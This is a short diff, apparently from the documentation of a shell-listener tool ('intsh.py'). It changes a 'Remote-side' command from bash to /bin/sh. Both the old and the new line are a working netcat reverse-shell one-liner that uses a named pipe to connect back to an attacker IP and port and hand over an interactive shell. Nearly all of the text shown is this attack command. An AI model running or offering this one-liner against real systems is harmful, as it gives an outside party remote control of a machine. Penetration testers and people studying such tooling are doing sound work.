@@ -17,5 +17,5 @@ python3 intsh.py <port>
 
 Remote-side:
 ```sh
-rm -f f; mkfifo f; <f nc <attacker-ip> <attacker-port> | bash > f
+rm -f f; mkfifo f; <f nc <attacker-ip> <attacker-port> | /bin/sh > f
 ```
